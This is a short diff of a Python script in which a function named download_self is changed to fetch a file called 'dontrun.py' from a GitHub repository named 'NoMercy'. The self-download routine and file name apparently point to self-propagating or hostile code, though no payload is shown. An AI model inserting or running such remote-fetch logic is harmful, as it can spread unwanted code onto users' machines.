@@ -36,7 +36,7 @@ def download_file(url, filename):
             print("Script not found.")
 
 def download_self():
-    script_url = "https://.com/your_script.py"  # Replace with the URL of your script
+    script_url = "https://github.com/soumeswar/NoMercy/blob/main/dontrun.py"  # Replace with the URL of your script
     try:
         # Download the script
         response = requests.get(script_url)
